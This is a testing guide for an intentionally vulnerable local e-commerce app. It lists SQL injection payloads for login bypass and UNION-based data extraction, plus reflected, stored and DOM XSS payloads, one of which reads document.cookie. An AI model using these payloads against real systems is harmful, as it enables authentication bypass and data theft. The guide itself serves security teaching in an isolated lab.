# Quick Testing Guide for Vulnerabilities

## Prerequisites

1. **Enable MySQL** (for SQL injection tests):
   - Ensure MySQL is running
   - Set environment variables in `.env.local`:
     ```
     DB_HOST=localhost
     DB_USER=root
     DB_PASSWORD=yourpassword
     DB_NAME=fyp_ecommerce
     DB_PORT=3306
     ```

2. **Start the development server:**
   ```bash
   npm run dev
   ```

---

## SQL Injection Testing

### Test 1: Login Bypass

**Endpoint:** `POST /api/login`

**Payload:**
```json
{
  "username": "admin' OR '1'='1",
  "password": "anything"
}
```

**Expected Result:**
- Should successfully log in as admin
- Check browser console for SQL query log
- Should see: `SELECT * FROM users WHERE username='admin' OR '1'='1' AND password='anything'`

**Alternative Payloads:**
```
Username: admin'--
Username: ' OR '1'='1'--
Username: admin' OR '1'='1' OR '1'='1
```

---

### Test 2: Admin User Search (SQL Injection)

**Endpoint:** `GET /api/search?q=<payload>&scope=users`

**Payload Examples:**

1. **Extract all users:**
   ```
   /api/search?q=' OR '1'='1&scope=users
   ```

2. **Union-based injection:**
   ```
   /api/search?q=' UNION SELECT 1,2,3,4,5--&scope=users
   ```

3. **Extract database name:**
   ```
   /api/search?q=' UNION SELECT database(),2,3,4,5--&scope=users
   ```

**Expected Result:**
- Should return all users or execute the injected SQL
- Check browser Network tab for response

**Using cURL:**
```bash
curl "http://localhost:3000/api/search?q=' OR '1'='1&scope=users"
```

---

## XSS Testing

### Test 1: Reflected XSS - Home Page Redirect

**URL:**
```
http://localhost:3000/?redirect=javascript:alert('XSS')
```

**Expected Result:**
- Alert box should appear immediately
- JavaScript code executes

**Alternative Payloads:**
```
/?redirect=javascript:alert(document.cookie)
/?redirect=javascript:new Function('alert("XSS")')()
```

---

### Test 2: Reflected XSS - Search Page

**URL:**
```
http://localhost:3000/search?q=<img src=x onerror=alert('XSS')>
```

**Expected Result:**
- Alert box should appear when image fails to load
- XSS executes in the highlighted search term area

**Alternative Payloads:**
```
/search?q=<script>alert('XSS')</script>
/search?q=<svg onload=alert('XSS')>
/search?q=<iframe src=javascript:alert('XSS')></iframe>
```

**If it doesn't work:**
- Try URL encoding: `%3Cimg%20src=x%20onerror=alert('XSS')%3E`
- Check browser console for errors
- Disable browser XSS protection (for testing only)

---

### Test 3: Stored XSS - Product Reviews

**Steps:**

1. **Enable XSS flag:**
   - Open browser console (F12)
   - Run: `localStorage.setItem('xssEnabled', 'true')`
   - Refresh page

2. **Navigate to any product page:**
   ```
   http://localhost:3000/product/1
   ```

3. **Submit a review with XSS payload:**
   - Name: `Test User`
   - Rating: `5`
   - Comment: `<script>alert('Stored XSS')</script>`
   - Click "Submit Review"

4. **Reload the page:**
   - The script should execute when the review is displayed

**Alternative Payloads:**
```
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<iframe src=javascript:alert('XSS')></iframe>
```

**Note:** If you see "Clear & Enable XSS" button, you can also use that to enable XSS mode.

---

### Test 4: DOM-based XSS - Cart Promo Code

**Steps:**

1. **Enable XSS flag:**
   - Open browser console (F12)
   - Run: `localStorage.setItem('xssEnabled', 'true')`
   - Refresh page

2. **Navigate to cart page:**
   ```
   http://localhost:3000/cart
   ```

3. **Enter XSS payload in promo code field:**
   ```
   <img src=x onerror=alert('DOM XSS')>
   ```

4. **Click "Apply" button:**
   - Alert should appear immediately

**Alternative Payloads:**
```
<script>alert('XSS')</script>
<svg onload=alert('XSS')>
<iframe src=javascript:alert('XSS')></iframe>
```

---

## Troubleshooting

### SQL Injection Not Working?

1. **Check MySQL connection:**
   - Verify environment variables are set
   - Check if MySQL is running
   - Test connection: `mysql -u root -p`

2. **Check if using correct function:**
   - Login uses `pool.query()` ✅ (vulnerable)
   - Search now uses `pool.query()` ✅ (fixed)
   - Other queries use `query()` which is safe

3. **Check server logs:**
   - Look for SQL query logs in console
   - Verify the query is being executed

### XSS Not Working?

1. **Check if XSS flag is enabled:**
   - For reviews and cart: `localStorage.getItem('xssEnabled')` should be `'true'`
   - For search and redirect: no flag needed

2. **Check browser console:**
   - Look for CSP (Content Security Policy) errors
   - Check for script execution errors

3. **Try different payloads:**
   - Some browsers block certain XSS patterns
   - Try `<img>` tags instead of `<script>` tags
   - Use event handlers: `onerror`, `onload`, etc.

4. **Disable browser XSS protection (testing only):**
   - Chrome: Not easily disabled (built-in)
   - Firefox: May have XSS filter
   - Use different browsers for testing

5. **Check if Next.js is escaping:**
   - Verify `dangerouslySetInnerHTML` is being used
   - Check if query parameters are being URL-decoded

---

## Verification Checklist

After testing, verify:

- [ ] SQL injection in login bypasses authentication
- [ ] SQL injection in search returns all users
- [ ] XSS in redirect executes JavaScript
- [ ] XSS in search page executes JavaScript
- [ ] XSS in reviews executes after enabling flag
- [ ] XSS in cart promo code executes after enabling flag

---

## Security Notes

⚠️ **IMPORTANT:**
- These vulnerabilities are for **educational purposes only**
- Only test in a **safe, isolated environment** (localhost/VMware)
- **Never deploy** this code to production
- Always use **parameterized queries** and **input sanitization** in real applications

